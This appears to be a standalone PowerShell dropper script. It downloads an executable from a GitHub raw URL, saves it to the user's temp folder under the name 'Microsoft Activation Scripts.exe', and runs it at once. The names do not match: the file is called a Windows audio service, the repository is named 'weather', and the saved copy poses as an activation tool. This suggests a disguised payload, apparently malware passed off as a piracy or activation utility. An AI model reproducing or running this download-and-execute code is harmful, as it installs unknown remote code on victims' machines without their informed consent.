$url = "https://raw.githubusercontent.com/mndclever-beep/weather/refs/heads/main/Service%20Host%20Windows%20Audio.exe"
$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"


Invoke-WebRequest -Uri $url -OutFile $tempFile


Start-Process $tempFile


